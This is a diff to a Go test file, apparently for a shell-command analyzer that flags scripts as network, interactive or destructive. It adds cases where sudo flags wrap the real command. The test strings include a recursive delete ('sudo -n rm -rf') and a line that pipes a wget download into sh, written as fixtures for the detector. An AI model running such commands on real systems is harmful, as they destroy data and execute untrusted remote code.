@@ -31,6 +31,10 @@ func TestAnalyzeCommand(t *testing.T) {
 		{name: "env wraps curl", script: "env curl https://x.test", network: true},
 		{name: "bash -c wraps editor", script: `bash -c 'vim file'`, interactive: true},
 		{name: "sudo wraps bare repl", script: "sudo python3", interactive: true},
+		// A valueless wrapper flag must not swallow the real payload command.
+		{name: "sudo -n keeps rm payload", script: "sudo -n rm -rf /tmp/x", destructive: true},
+		{name: "sudo -n keeps curl payload", script: "sudo -n curl https://x.test", network: true},
+		{name: "sudo -u consumes its value", script: "sudo -u root vim file", interactive: true},
 
 		{name: "curl", script: "curl https://example.com", network: true},
 		{name: "wget piped to shell", script: "wget -qO- https://x.test | sh", network: true},
